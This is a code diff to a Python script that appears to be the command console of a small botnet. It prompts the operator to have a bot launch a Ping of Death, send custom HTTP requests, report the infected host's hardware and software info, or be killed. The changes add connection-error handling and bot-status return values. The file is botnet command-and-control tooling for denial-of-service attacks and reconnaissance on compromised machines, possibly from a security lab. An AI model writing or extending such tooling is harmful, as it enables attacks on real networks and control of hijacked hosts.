@@ -2,6 +2,7 @@ import socket
 import json
 import pprint
 
+
 def get_action(bot):
     action = input("[IRC] Perform Ping of Death by bot ('f'), send a custom http request ('c'), get hardware/software info of bot (i), kill the bot ('kill') or exit irc connection('exit'). . . ") 
     if action == 'f':
@@ -22,7 +23,12 @@ def irc_client_program():
 
     # connect to server
     client_socket = socket.socket()
-    client_socket.connect((bot, port))
+    try:
+        client_socket.connect((bot, port))
+    except socket.error as serr:
+        if serr.errno == socket.errno.ECONNREFUSED:
+            print(f"[IRC] Bot with ip {bot} not reachable, check bots reachable using command 'dump'")
+            return f"down:{bot}"
 
     while True:
         msg = get_action(bot)
@@ -31,14 +37,18 @@ def irc_client_program():
 
         # data = client_socket.recv(1024).decode()
         # print('Received from server: ' + data)
-        if msg == 'exit' or msg == 'kill':
-            break
+        if msg == 'exit':
+            client_socket.close()
+            return 1
+        elif msg == "kill":
+            client_socket.close()
+            return f"down:{bot}"
         if msg.split(':')[0] == "hwsw":
             hw_sw_infos = client_socket.recv(4096).decode()
             hw_sw_infos = json.loads(hw_sw_infos)
             pprint.pprint(hw_sw_infos)
     
-    client_socket.close()
+    return 0
 
 
 if __name__ == '__main__':
